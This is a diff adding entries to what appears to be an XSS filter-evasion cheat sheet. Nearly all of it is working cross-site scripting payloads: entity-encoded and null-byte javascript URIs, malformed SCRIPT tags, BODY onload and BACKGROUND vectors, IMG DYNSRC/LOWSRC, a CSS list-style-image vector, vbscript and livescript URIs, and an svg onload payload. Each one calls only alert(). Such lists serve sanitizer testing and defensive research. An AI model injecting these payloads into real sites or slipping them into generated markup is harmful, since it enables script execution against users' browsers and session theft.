@@ -45,5 +45,39 @@
 <IMG SRC =  &#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29  >
   perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
 
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+INPUT Image
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+BODY Image
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+IMG Dynsrc
+<IMG DYNSRC="javascript:alert('XSS')">
+
+IMG Lowsrc
+<IMG LOWSRC="javascript:alert('XSS')">
+
+List-style-image
+Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
+
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+
+VBscript in an Image
+<IMG SRC='vbscript:msgbox("XSS")'>
+
+Livescript (older versions of Netscape only)
+<IMG SRC="livescript:[code]">
+
+SVG Object Tag
+<svg/onload=alert('XSS')>
 
